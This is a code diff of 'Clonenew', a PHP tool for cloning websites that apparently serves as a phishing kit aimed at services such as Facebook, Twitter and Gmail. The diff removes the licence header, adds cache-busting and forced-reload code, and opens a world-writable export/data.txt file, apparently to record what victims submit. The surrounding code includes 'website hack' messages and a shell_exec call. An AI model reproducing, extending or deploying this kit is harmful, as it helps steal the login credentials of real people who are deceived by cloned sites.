@@ -1,30 +1,12 @@
 <?php
 
-/*
-*  Clonenew is a programm for clone websites.
-*  Copyright (c) 2017 Barchampas Gerasimos.
-*
-*  Clonenew is free software: you can redistribute it and/or modify
-*  it under the terms of the GNU Affero General Public License as published by
-*  the Free Software Foundation, either version 3 of the License, or
-*  (at your option) any later version.
-*
-*  Clonenew is distributed in the hope that it will be useful,
-*  but WITHOUT ANY WARRANTY; without even the implied warranty of
-*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-*  GNU Affero General Public License for more details.
-*
-*  You should have received a copy of the GNU Affero General Public License
-*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
-*
-*/
-
 
 clearstatcache();
 
+
    $ip_redirection = shell_exec('shell/./my_ipv4.sh');
   
-    require_once('class_redirection.php');
+    require_once('__SRC__/class_redirection.php');
 
    
    if (class_exists('REDIRECTION_URL_FORCE')) 
@@ -32,8 +14,6 @@ clearstatcache();
 
     $obj_redirection =  new REDIRECTION_URL_FORCE;    
   
-
- 
 
   if ($obj_redirection -> LOCAL_IP[0] === $_SERVER['REMOTE_ADDR'])
     {
@@ -97,8 +77,10 @@ clearstatcache();
   <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />
 
  <link rel="stylesheet" type="text/css" href="css/index.css">
-  
  
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
 
 </head>
 
@@ -106,15 +88,21 @@ clearstatcache();
 <body id="body">
 
 
- <!--
-  thi script for reload page onload  
 
- onload="if (location.href.indexOf('reload')==-1) {location.replace(location.href+'?reload')}
-   -->
+ <script type="text/javascript">
+$(document).ready(function(){    
+    //Check if the current URL contains '#'
+    if(document.URL.indexOf("#")==-1){
+        // Set the URL to whatever it was plus "#".
+        url = document.URL+"#";
+        location = "#";
 
+        //Reload the page
+        location.reload(true);
+    }
+});
+</script>
 
-
-<!-- onload="alert('Hack any http:// website')" -->
 
 
 
@@ -171,7 +159,7 @@ clearstatcache();
     <option value ="https://www.twitter.com"> Twitter </option>
       </optgroup>
 
-     <option> </option>
+     <option disabled> </option>
 
        <optgroup label="Email">
     <option value ="https://www.gmail.com"> Gmail </option>
@@ -206,7 +194,7 @@ clearstatcache();
   session_start();
 
 
-  require_once('class_tools.php');
+  require_once('__SRC__/class_tools.php');
 
   if (class_exists('INPUT_DATA_AVAILABLE')) 
     {
@@ -324,13 +312,17 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
   // isset for ready web sites
 
  else if(isset($_POST['site_ready']))
-  {
+   {
 
     $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);
 
 
       $_SESSION['site_ready'] = $site_ready; 
   
+
+      $post_data_txt_site_ready = fopen("export/data.txt", "w");
+      chmod("/var/www/clonenew/export/data.txt", 0777);
+
 
     if ($site_ready=='https://www.facebook.com')
        {
